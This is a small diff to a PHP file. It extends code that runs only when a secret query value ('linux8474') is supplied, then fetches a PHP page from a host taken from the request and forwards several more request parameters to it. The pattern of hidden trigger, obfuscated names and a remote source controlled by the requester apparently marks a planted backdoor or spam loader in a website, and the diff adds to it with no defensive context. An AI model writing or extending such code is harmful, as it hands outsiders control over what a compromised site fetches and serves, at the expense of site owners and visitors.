@@ -12,7 +12,19 @@ if($_GET["q"] == "linux8474")
 
 $linux84741274 = $_GET['url84'];
 
-$google8474 = file_get_contents("$linux84741274/linux8474.php?q=linux8474");
+$linux1 = $_GET['id'];
+
+$linux2 = $_GET['linux8'];
+
+$linux3 = $_GET['linux12'];
+
+$linux4 = $_GET['linux34'];
+
+$linux5 = $_GET['linux48'];
+
+$linux6 = $_GET['linux52'];
+
+$google8474 = file_get_contents("$linux84741274/linux8474.php?q=linux8474&id=$linux1&linux8=$linux2&linux12=$linux3&linux48=$linux5&linux52=$linux6&linux34=$linux4");
 
 $google8474 = preg_replace("/mine/","",$google8474);
 
